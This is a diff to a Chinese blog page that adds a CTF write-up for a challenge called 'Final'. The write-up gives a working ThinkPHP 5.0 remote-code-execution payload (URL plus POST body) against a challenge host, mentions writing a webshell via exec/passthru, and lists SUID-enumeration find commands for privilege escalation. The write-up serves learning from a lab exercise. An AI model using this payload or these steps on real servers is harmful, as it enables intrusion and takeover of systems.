@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">3.4k</span>
+            <span class="post-count">3.5k</span>
         </span>
     </span>
 
@@ -832,6 +832,11 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
 
 <p>在访问主页面发现页面显示1<br><img src="https://img-blog.csdnimg.cn/ba72b904153041518054f8b91dc9fa42.png" alt="1"></p>
 <p>然后命令执行找到flag文件即可<br><img src="https://img-blog.csdnimg.cn/08117b98aae246469e673400a37b8fd7.png" alt="4"></p>
+<h2 id="week5-web"><a href="#week5-web" class="headerlink" title="week5-web"></a>week5-web</h2><h3 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h3><p>thinkphp版本V5.0，查找相关漏洞<br>可以使用thinkphp漏洞检测工具检测<br><img src="https://img-blog.csdnimg.cn/9c5d9c30762645d5bd5e2908a85aa5a9.png" alt="123"><br>当然也可以自己找payload。<br><code>Payload: http://a3b86432-64d4-4f0b-baf9-2ff5ed65a5aa.node4.buuoj.cn:81/?s=captcha&amp;test=-1  Post: _method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=1</code><br>发现禁用了函数<br><img src="https://img-blog.csdnimg.cn/a61aa626bbbc41139d0549f5f6a31875.png" alt="78"><br>使用<code>exec、passthru</code>代替，然后写入一句话木马。<br><img src="https://img-blog.csdnimg.cn/f990d9432a94456393f414f51e9683f0.png" alt="456"><br>成功写入<br><img src="https://img-blog.csdnimg.cn/7db60203c64241acac20e5d7a58b229d.png" alt="123"><br>但是还要进行提权<br><img src="https://img-blog.csdnimg.cn/937b271605e24fff8b6180ca5049e0a1.png" alt="789"><br>查看具有SUID权限的命令：</p>
+<blockquote>
+<p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null<br>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<br>find &#x2F; -user root -perm -4000 -exec ls -ldb {} ;</p>
+</blockquote>
+<p>后面借助<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>进行提权吧！！！</p>
  
       <!-- reward -->
       
